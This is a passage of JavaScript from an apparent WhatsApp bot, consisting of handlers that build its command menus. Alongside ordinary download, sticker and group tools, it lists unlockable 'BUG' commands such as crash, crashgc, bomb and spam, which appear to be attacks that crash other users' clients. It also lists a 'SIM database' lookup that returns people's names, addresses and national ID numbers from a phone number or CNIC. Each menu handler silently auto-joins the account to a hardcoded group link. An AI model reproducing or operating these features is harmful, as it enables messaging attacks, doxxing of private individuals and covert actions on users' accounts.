┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 📢 BROADCAST* ◆━━┓
│❖ ${prefix}bcmenu
│❖ ${prefix}bcgroups <msg> — Send to all groups
│❖ ${prefix}bcusers <msg> — Send to all private chats
│❖ ${prefix}bcstop — Cancel active broadcast
│❖ ${prefix}bcsettings on/off — Per-User ON/OFF
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐀𝐍𝐈𝐌𝐄* ◆━━┓
│❖ ${prefix}akiyama
│❖ ${prefix}ana
│❖ ${prefix}animebite
│❖ ${prefix}animeblush
│❖ ${prefix}animebonk
│❖ ${prefix}animebully
│❖ ${prefix}animecringe
│❖ ${prefix}animedance
│❖ ${prefix}animedl
│❖ ${prefix}animeglomp
│❖ ${prefix}animehappy
│❖ ${prefix}animehighfive
│❖ ${prefix}animekill
│❖ ${prefix}animelick
│❖ ${prefix}animepoke
│❖ ${prefix}animesearch
│❖ ${prefix}animesmile
│❖ ${prefix}animesmug
│❖ ${prefix}animewave
│❖ ${prefix}animewink
│❖ ${prefix}animewlp
│❖ ${prefix}animeyeet
│❖ ${prefix}art
│❖ ${prefix}asuna
│❖ ${prefix}ayuzawa
│❖ ${prefix}bluearchive
│❖ ${prefix}boruto
│❖ ${prefix}bts
│❖ ${prefix}cartoon
│❖ ${prefix}cecan
│❖ ${prefix}chiho
│❖ ${prefix}chinagirl
│❖ ${prefix}chitoge
│❖ ${prefix}cogan
│❖ ${prefix}cosplay
│❖ ${prefix}cosplayloli
│❖ ${prefix}cosplaysagiri
│❖ ${prefix}cyber
│❖ ${prefix}deidara
│❖ ${prefix}doraemon
│❖ ${prefix}elaina
│❖ ${prefix}emilia
│❖ ${prefix}erza
│❖ ${prefix}exo
│❖ ${prefix}femdom
│❖ ${prefix}freefire
│❖ ${prefix}gamewallpaper
│❖ ${prefix}glasses
│❖ ${prefix}gremory
│❖ ${prefix}hacker
│❖ ${prefix}hentai
│❖ ${prefix}hestia
│❖ ${prefix}husbu
│❖ ${prefix}inori
│❖ ${prefix}islamic
│❖ ${prefix}isuzu
│❖ ${prefix}itachi
│❖ ${prefix}itori
│❖ ${prefix}jennie
│❖ ${prefix}jiso
│❖ ${prefix}justina
│❖ ${prefix}kaga
│❖ ${prefix}kagura
│❖ ${prefix}kakashi
│❖ ${prefix}kaori
│❖ ${prefix}keneki
│❖ ${prefix}kotori
│❖ ${prefix}kpop
│❖ ${prefix}kucing
│❖ ${prefix}kurumi
│❖ ${prefix}lisa
│❖ ${prefix}loli
│❖ ${prefix}madara
│❖ ${prefix}manga
│❖ ${prefix}megumin
│❖ ${prefix}mikasa
│❖ ${prefix}mikey
│❖ ${prefix}miku
│❖ ${prefix}minato
│❖ ${prefix}mobile
│❖ ${prefix}moe
│❖ ${prefix}motor
│❖ ${prefix}mountain
│❖ ${prefix}naruto
│❖ ${prefix}neko
│❖ ${prefix}neko2
│❖ ${prefix}nekonime
│❖ ${prefix}nezuko
${_senderAdultUnlocked ? '│❖ ' + prefix + 'nsfw' : ''}
│❖ ${prefix}onepiece
│❖ ${prefix}pentol
│❖ ${prefix}pokemon
│❖ ${prefix}profil
│❖ ${prefix}programming
│❖ ${prefix}pubg
│❖ ${prefix}randblackpink
│❖ ${prefix}randomnime
│❖ ${prefix}randomnime2
│❖ ${prefix}rize
│❖ ${prefix}rose
│❖ ${prefix}ryujin
│❖ ${prefix}sagiri
│❖ ${prefix}sakura
│❖ ${prefix}sasuke
│❖ ${prefix}satanic
│❖ ${prefix}sfw
│❖ ${prefix}shina
│❖ ${prefix}shinka
│❖ ${prefix}shinomiya
│❖ ${prefix}shizuka
│❖ ${prefix}shota
│❖ ${prefix}shortquote
│❖ ${prefix}space
│❖ ${prefix}technology
│❖ ${prefix}tejina
│❖ ${prefix}toukachan
│❖ ${prefix}tsunade
│❖ ${prefix}waifu
│❖ ${prefix}wallhp
│❖ ${prefix}wallml
│❖ ${prefix}wallmlnime
│❖ ${prefix}yotsuba
│❖ ${prefix}yuki
│❖ ${prefix}yulibocil
│❖ ${prefix}yumeko
┗━━━━━━━━━━━━━━━━━━━━┛

${_senderBugUnlocked ? `┏━━◆ *CYBER - 𝐁𝐔𝐆* ◆━━┓
│❖ ${prefix}blank
│❖ ${prefix}blankgc
│❖ ${prefix}bomb
│❖ ${prefix}bruteclose
│❖ ${prefix}buggc
│❖ ${prefix}close-zapp
│❖ ${prefix}crash
│❖ ${prefix}crashgc
│❖ ${prefix}cyber-destroy
│❖ ${prefix}cyberclose
│❖ ${prefix}cyberkillgc
│❖ ${prefix}cyberinvis
│❖ ${prefix}delay
│❖ ${prefix}delayhard
│❖ ${prefix}ghostcrash
│❖ ${prefix}godmode
│❖ ${prefix}killswitch
│❖ ${prefix}megabug
│❖ ${prefix}metaclose
│❖ ${prefix}spam
│❖ ${prefix}ultrabug
│❖ ${prefix}xgroup
┗━━━━━━━━━━━━━━━━━━━━┛` : ''}

┏━━◆ *CYBER - 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃* ◆━━┓
│❖ ${prefix}apk
│❖ ${prefix}apkdl
│❖ ${prefix}dlmovie
│❖ ${prefix}dlstatus
│❖ ${prefix}facebook
│❖ ${prefix}fb
│❖ ${prefix}fbdl
│❖ ${prefix}film
│❖ ${prefix}getbot
│❖ ${prefix}gitclone
│❖ ${prefix}ig
│❖ ${prefix}igdl
│❖ ${prefix}imbd
│❖ ${prefix}imdb
│❖ ${prefix}instagram
│❖ ${prefix}mediafire
│❖ ${prefix}movie
│❖ ${prefix}movie2
│❖ ${prefix}mp4
│❖ ${prefix}pinterest
│❖ ${prefix}play
│❖ ${prefix}play2
│❖ ${prefix}selectmovie
│❖ ${prefix}sp
│❖ ${prefix}spotify
│❖ ${prefix}spotifydl
│❖ ${prefix}statusdl
│❖ ${prefix}swdl
│❖ ${prefix}tgstickers
│❖ ${prefix}tiktok
│❖ ${prefix}tt
│❖ ${prefix}twit
│❖ ${prefix}twitter
│❖ ${prefix}twitterdl
│❖ ${prefix}video
│❖ ${prefix}xdl
${_senderAdultUnlocked ? '│❖ ' + prefix + 'xnxx' : ''}
│❖ ${prefix}ytdl
│❖ ${prefix}ytdown
│❖ ${prefix}ytmp3
│❖ ${prefix}ytmp4
│❖ ${prefix}ytsearch
│❖ ${prefix}yts
│❖ ${prefix}ytvideo
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐅𝐔𝐍* ◆━━┓
│❖ ${prefix}8ball
│❖ ${prefix}advice
│❖ ${prefix}ascii
│❖ ${prefix}compliment
│❖ ${prefix}dadjoke
│❖ ${prefix}dare
│❖ ${prefix}fact
│❖ ${prefix}flirt
│❖ ${prefix}funfact
│❖ ${prefix}gaycheck
│❖ ${prefix}greatcheck
│❖ ${prefix}joke
│❖ ${prefix}quote
│❖ ${prefix}rate
│❖ ${prefix}rewrite
│❖ ${prefix}roast
│❖ ${prefix}ship
│❖ ${prefix}story
│❖ ${prefix}stupidcheck
│❖ ${prefix}tod
│❖ ${prefix}truth
│❖ ${prefix}truthdare
│❖ ${prefix}urban
│❖ ${prefix}wouldyou
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐆𝐀𝐌𝐄𝐒* ◆━━┓
│❖ ${prefix}coin
│❖ ${prefix}coinbattle
│❖ ${prefix}dice
│❖ ${prefix}emojiquiz
│❖ ${prefix}gamefact
│❖ ${prefix}guess
│❖ ${prefix}hangman
│❖ ${prefix}math
│❖ ${prefix}mathfact
│❖ ${prefix}numbattle
│❖ ${prefix}numberbattle
│❖ ${prefix}rps
│❖ ${prefix}rpsls
│❖ ${prefix}tictactoe
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐆𝐑𝐎𝐔𝐏* ◆━━┓
│❖ ${prefix}acceptall
│❖ ${prefix}add
│❖ ${prefix}adel
│❖ ${prefix}admin
│❖ ${prefix}ae
│❖ ${prefix}announce
│❖ ${prefix}announcement
│❖ ${prefix}antibot
│❖ ${prefix}antibadword
│❖ ${prefix}antibeg
│❖ ${prefix}antilink
│❖ ${prefix}antilinkkick
│❖ ${prefix}antilinkwarn
│❖ ${prefix}antilinkgc
│❖ ${prefix}antilinkgckick
│❖ ${prefix}antispam
│❖ ${prefix}antitag
│❖ ${prefix}antitagwarn
│❖ ${prefix}antitagadmin
│❖ ${prefix}antitagadminwarn
│❖ ${prefix}antigroupmention
│❖ ${prefix}antigroupmentionkick
│❖ ${prefix}antigroupmentionwarn
│❖ ${prefix}checkwarns
│❖ ${prefix}closetime
│❖ ${prefix}createpoll
│❖ ${prefix}creategc
│❖ ${prefix}creategroup
│❖ ${prefix}demote
│❖ ${prefix}gclink
│❖ ${prefix}gcsettings
│❖ ${prefix}gid
│❖ ${prefix}ginfo
│❖ ${prefix}goodbye
│❖ ${prefix}groupinfo
│❖ ${prefix}groupjid
│❖ ${prefix}grouplink
│❖ ${prefix}groupstatus
│❖ ${prefix}groupsettings
│❖ ${prefix}gst
│❖ ${prefix}gstatus
│❖ ${prefix}hidetag
│❖ ${prefix}invite
│❖ ${prefix}join
│❖ ${prefix}kick
│❖ ${prefix}kickadmins
│❖ ${prefix}kickall
│❖ ${prefix}left
│❖ ${prefix}linkgc
│❖ ${prefix}listadmin
│❖ ${prefix}listadmins
│❖ ${prefix}listonline
│❖ ${prefix}members
│❖ ${prefix}mute
│❖ ${prefix}mutemember
│❖ ${prefix}muteuser
│❖ ${prefix}opentime
│❖ ${prefix}poll
│❖ ${prefix}promote
│❖ ${prefix}rejectall
│❖ ${prefix}resetlink
│❖ ${prefix}resetwarn
│❖ ${prefix}resetwarns
│❖ ${prefix}revoke
│❖ ${prefix}revokelink
│❖ ${prefix}setdesc
│❖ ${prefix}setgcdesc
│❖ ${prefix}setgcname
│❖ ${prefix}setgcpp
│❖ ${prefix}setgrouppp
│❖ ${prefix}setname
│❖ ${prefix}tag
│❖ ${prefix}tagadmin
│❖ ${prefix}tagall
│❖ ${prefix}totalmembers
│❖ ${prefix}totag
│❖ ${prefix}unmute
│❖ ${prefix}unmutemember
│❖ ${prefix}unmuteuser
│❖ ${prefix}warn
│❖ ${prefix}warnlimit
│❖ ${prefix}warns
│❖ ${prefix}welcome
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐋𝐎𝐆𝐎* ◆━━┓
│❖ ${prefix}advancedglow
│❖ ${prefix}blackpinklogo
│❖ ${prefix}blackpinkstyle
│❖ ${prefix}cartoonstyle
│❖ ${prefix}deletingtext
│❖ ${prefix}effectclouds
│❖ ${prefix}flag3dtext
│❖ ${prefix}flagtext
│❖ ${prefix}freecreate
│❖ ${prefix}galaxystyle
│❖ ${prefix}galaxywallpaper
│❖ ${prefix}gfx
│❖ ${prefix}gfx10
│❖ ${prefix}gfx11
│❖ ${prefix}gfx12
│❖ ${prefix}gfx2
│❖ ${prefix}gfx3
│❖ ${prefix}gfx4
│❖ ${prefix}gfx5
│❖ ${prefix}gfx6
│❖ ${prefix}gfx7
│❖ ${prefix}gfx8
│❖ ${prefix}gfx9
│❖ ${prefix}glitchtext
│❖ ${prefix}glowingtext
│❖ ${prefix}gradienttext
│❖ ${prefix}lighteffects
│❖ ${prefix}logomaker
│❖ ${prefix}luxurygold
│❖ ${prefix}makingneon
│❖ ${prefix}multicoloredneon
│❖ ${prefix}neonglitch
│❖ ${prefix}papercutstyle
│❖ ${prefix}pixelglitch
│❖ ${prefix}royaltext
│❖ ${prefix}sandsummer
│❖ ${prefix}style1917
│❖ ${prefix}summerbeach
│❖ ${prefix}typographytext
│❖ ${prefix}underwatertext
│❖ ${prefix}watercolortext
│❖ ${prefix}writetext
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐎𝐖𝐍𝐄𝐑* ◆━━┓
│❖ .
│❖ ${prefix}addsudo
│❖ ${prefix}antibot
│❖ ${prefix}antibadword
│❖ ${prefix}antidelete
│❖ ${prefix}antiedit
│❖ ${prefix}anticall
│❖ ${prefix}setbio
│❖ ${prefix}autoreact
│❖ ${prefix}autoread
│❖ ${prefix}autorecording
│❖ ${prefix}autorecordtype
│❖ ${prefix}autoreactstatusdelay
│❖ ${prefix}autoreply
│❖ ${prefix}autotyping
│❖ ${prefix}autoviewstatus
│❖ ${prefix}autoviewstatusdelay
│❖ ${prefix}ban
│❖ ${prefix}banuser
│❖ ${prefix}banuser1
│❖ ${prefix}block
│❖ ${prefix}broadcast
│❖ ${prefix}config
│❖ ${prefix}delanticallmsg
│❖ ${prefix}delsudo
│❖ ${prefix}getsudo
│❖ ${prefix}listban
│❖ ${prefix}listbanuser
│❖ ${prefix}listsudo
│❖ ${prefix}locksettings
│❖ ${prefix}private
│❖ ${prefix}public
│❖ ${prefix}self
│❖ ${prefix}set
│❖ ${prefix}setanticallmsg
│❖ ${prefix}setpp
│❖ ${prefix}setsudo
│❖ ${prefix}setprefix
│❖ ${prefix}settings
│❖ ${prefix}showanticallmsg
│❖ ${prefix}statusemoji
│❖ ${prefix}sudo
│❖ ${prefix}testanticallmsg
│❖ ${prefix}unban
│❖ ${prefix}unbanuser
│❖ ${prefix}unbanuser1
│❖ ${prefix}unblock
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐒𝐓𝐈𝐂𝐊𝐄𝐑* ◆━━┓
│❖ ${prefix}awoo
│❖ ${prefix}bite
│❖ ${prefix}blush
│❖ ${prefix}bonk
│❖ ${prefix}bully
│❖ ${prefix}cringe
│❖ ${prefix}cry
│❖ ${prefix}cuddle
│❖ ${prefix}dance
│❖ ${prefix}delstickercmd
│❖ ${prefix}glomp
│❖ ${prefix}handhold
│❖ ${prefix}happy
│❖ ${prefix}highfive
│❖ ${prefix}hug
│❖ ${prefix}kill
│❖ ${prefix}kiss
│❖ ${prefix}lick
│❖ ${prefix}nom
│❖ ${prefix}pat
│❖ ${prefix}poke
│❖ ${prefix}qc
│❖ ${prefix}s
│❖ ${prefix}setstickercmd
│❖ ${prefix}shinobu
│❖ ${prefix}slap
│❖ ${prefix}smile
│❖ ${prefix}smug
│❖ ${prefix}steal
│❖ ${prefix}sticker
│❖ ${prefix}stickercmds
│❖ ${prefix}stickerthf
│❖ ${prefix}stickerwm
│❖ ${prefix}take
│❖ ${prefix}tosticker
│❖ ${prefix}wave
│❖ ${prefix}wink
│❖ ${prefix}wm
│❖ ${prefix}yeet
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐓𝐎𝐎𝐋𝐒* ◆━━┓
│❖ ${prefix}calculate
│❖ ${prefix}calculator
│❖ ${prefix}carimage
│❖ ${prefix}cartoonify
│❖ ${prefix}currency
│❖ ${prefix}currencies
│❖ ${prefix}define
│❖ ${prefix}dictionary
│❖ ${prefix}ffstalk
│❖ ${prefix}genpass
│❖ ${prefix}myip
│❖ ${prefix}npm
│❖ ${prefix}npmstalk
│❖ ${prefix}profile
│❖ ${prefix}profile-pictures
│❖ ${prefix}qrcode
│❖ ${prefix}readqr
│❖ ${prefix}readmore
│❖ ${prefix}removebg
│❖ ${prefix}remind
│❖ ${prefix}shorturl
│❖ ${prefix}styletext
│❖ ${prefix}tomp3
│❖ ${prefix}tomp4
│❖ ${prefix}toimg
│❖ ${prefix}tourl
│❖ ${prefix}translate
│❖ ${prefix}url
│❖ ${prefix}weather
│❖ ${prefix}weather2
│❖ ${prefix}weatherinfo
│❖ ${prefix}whois
│❖ ${prefix}wiki
│❖ ${prefix}wikipedia
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐕𝐎𝐈𝐂𝐄* ◆━━┓
│❖ ${prefix}bass
│❖ ${prefix}blown
│❖ ${prefix}deep
│❖ ${prefix}earrape
│❖ ${prefix}fast
│❖ ${prefix}fat
│❖ ${prefix}gtts
│❖ ${prefix}nightcore
│❖ ${prefix}reverse
│❖ ${prefix}robot
│❖ ${prefix}say
│❖ ${prefix}slow
│❖ ${prefix}smooth
│❖ ${prefix}squirrel
│❖ ${prefix}tts
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐎𝐓𝐇𝐄𝐑* ◆━━┓
│❖ ${prefix}😭
│❖ ${prefix}account
│❖ ${prefix}alive
│❖ ${prefix}aza
│❖ ${prefix}buy-panel
│❖ ${prefix}cat
│❖ ${prefix}checkmail
│❖ ${prefix}checkmails
│❖ ${prefix}coffee
│❖ ${prefix}del
│❖ ${prefix}delete
│❖ ${prefix}delmail
│❖ ${prefix}delpair
│❖ ${prefix}deltemp
│❖ ${prefix}deltmp
│❖ ${prefix}deletemail
│❖ ${prefix}dog
│❖ ${prefix}download
│❖ ${prefix}fox
│❖ ${prefix}freebot
│❖ ${prefix}gellltbot
│❖ ${prefix}getpp
│❖ ${prefix}git
│❖ ${prefix}idch
│❖ ${prefix}inbox
│❖ ${prefix}jid
│❖ ${prefix}kopi
│❖ ${prefix}listpair
│❖ ${prefix}mode
│❖ ${prefix}newmail
│❖ ${prefix}nsbxmdmfw
│❖ ${prefix}owner
│❖ ${prefix}pair
│❖ ${prefix}panda
│❖ ${prefix}paptt
│❖ ${prefix}ping
│❖ ${prefix}poem
│❖ ${prefix}prog
│❖ ${prefix}progquote
│❖ ${prefix}random-girl
│❖ ${prefix}react-ch
│❖ ${prefix}react-channel
│❖ ${prefix}reactbcnch
│❖ ${prefix}reademail
│❖ ${prefix}readmail
│❖ ${prefix}readviewonce2
│❖ ${prefix}repo
│❖ ${prefix}runtime
│❖ ${prefix}save
│❖ ${prefix}speed
│❖ ${prefix}svt
│❖ ${prefix}tempmail
│❖ ${prefix}tempmail2
│❖ ${prefix}tempmail-inbox
│❖ ${prefix}test
│❖ ${prefix}tmpmail
│❖ ${prefix}vkfkk
│❖ ${prefix}vv
│❖ ${prefix}vv2
│❖ ${prefix}vvgh
│❖ ${prefix}github
│❖ ${prefix}setaccount
${_senderAdultUnlocked ? '│❖ ' + prefix + 'xvideos\n│❖ ' + prefix + 'xvideodl\n│❖ ' + prefix + 'xvideosearch\n│❖ ' + prefix + 'xnxxsearch\n│❖ ' + prefix + 'xnxx' : '│🔒 *Locked Commands*\n│  Use .addkey to access these'}
┗━━━━━━━━━━━━━━━━━━━━┛

${_senderBugUnlocked ? `┏━━◆ *CYBER - 𝐒𝐈𝐌 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄* ◆━━┓
│
│ ◈ *🔍 𝗦𝗘𝗔𝗥𝗖𝗛 𝗕𝗬 𝗣𝗛𝗢𝗡𝗘 𝗡𝗨𝗠𝗕𝗘𝗥*
│❖ ${prefix}simdata 3001234567
│❖ ${prefix}allsim 3001234567
│❖ ${prefix}sim 3001234567
│   ↳ _03xxxxxxxxx ya 923xxxxxxxxx_
│
│ ◈ *🆔 𝗦𝗘𝗔𝗥𝗖𝗛 𝗕𝗬 𝗖𝗡𝗜𝗖*
│❖ ${prefix}cnicdata 1234512345671
│❖ ${prefix}cnic 1234512345671
│   ↳ _13 digit CNIC number_
│
│ ◈ *📋 𝗦𝗜𝗠 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘 𝗠𝗘𝗡𝗨*
│❖ ${prefix}simdatabase
│❖ ${prefix}simdb
│
│ ◈ *📊 𝗗𝗔𝗧𝗔 𝗙𝗜𝗘𝗟𝗗𝗦*
│  👤 Full Name  📱 Phone
│  🆔 CNIC       🏠 Address
│  📡 Network    ✅ Results Real-time
│
┗━━━━━━━━━━━━━━━━━━━━┛` : ''}

┏━━◆ *CYBER - 📺 TV CHANNELS* ◆━━┓
│❖ ${prefix}tvmenu
│  ↳ _See all 91 Pakistan channels_
│❖ ${prefix}tv [channel name]
│  ↳ _Get live stream link_
│
│ *Example:*
│  ${prefix}tv geo news
│  ${prefix}tv ary news
│  ${prefix}tv hum tv
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'menu':
case 'CYBER': {
   setImmediate(() => autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {}));
    devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } }, { priority: true }).catch(() => {});

    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐌𝐄𝐍𝐔 𝐂𝐀𝐓𝐄𝐆𝐎𝐑𝐈𝐄𝐒* ◆━━┓
│❖ ${prefix}allmenu
│❖ ${prefix}aimenu
│❖ ${prefix}animemenu
${_senderBugUnlocked ? '│❖ ' + prefix + 'bugmenu' : ''}
│❖ ${prefix}downloadmenu
│❖ ${prefix}funmenu
│❖ ${prefix}gamemenu
│❖ ${prefix}groupmenu
│❖ ${prefix}logomenu
│❖ ${prefix}ownermenu
│❖ ${prefix}stickermenu
│❖ ${prefix}toolsmenu
${_senderBugUnlocked ? '│❖ ' + prefix + 'simdatabase' : ''}
│❖ ${prefix}tvmenu
│❖ ${prefix}tradingmenu
│❖ ${prefix}bcmenu
│❖ ${prefix}voicemenu
│❖ ${prefix}othermenu
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
`;

    await reply(menuText);
}
break;

case 'aimenu':
case 'CYBERai': {
    autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐀𝐈* ◆━━┓
│❖ ${prefix}ai
│❖ ${prefix}aipic
│❖ ${prefix}codeai
│❖ ${prefix}deepseek
│❖ ${prefix}gemini
│❖ ${prefix}gemivbnni
│❖ ${prefix}gpt
│❖ ${prefix}gpt3
│❖ ${prefix}gpt4
│❖ ${prefix}gpt5
│❖ ${prefix}grok
│❖ ${prefix}grovnnk-ai
│❖ ${prefix}metaai
│❖ ${prefix}metabcn-ai
│❖ ${prefix}photoai
│❖ ${prefix}qwen
│❖ ${prefix}qwenxj
│❖ ${prefix}storyai
│❖ ${prefix}triviaai
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'animemenu':
case 'CYBERanime': {
    autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
